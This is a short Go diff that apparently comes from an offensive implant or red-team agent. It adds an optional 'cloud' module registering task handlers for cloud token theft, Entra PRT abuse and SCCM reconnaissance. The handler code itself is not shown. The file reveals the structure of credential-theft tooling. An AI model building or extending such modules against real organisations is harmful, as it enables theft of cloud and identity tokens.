@@ -1,0 +1,15 @@
+//go:build linux || windows || darwin
+// +build linux windows darwin
+
+package main
+
+// Task registry: the optional "cloud" module (see internal/payload/agent_modules.go).
+// The generator drops this file whole when the operator excludes the module;
+// every entry point below disappears with it and the linker dead-codes the
+// unreferenced handlers.
+
+func init() {
+	taskHandlers["cloud_steal"] = handleCloudTokenTheft
+	taskHandlers["entra_prt"] = handleEntraPRT
+	taskHandlers["sccm_recon"] = handleSccmRecon
+}
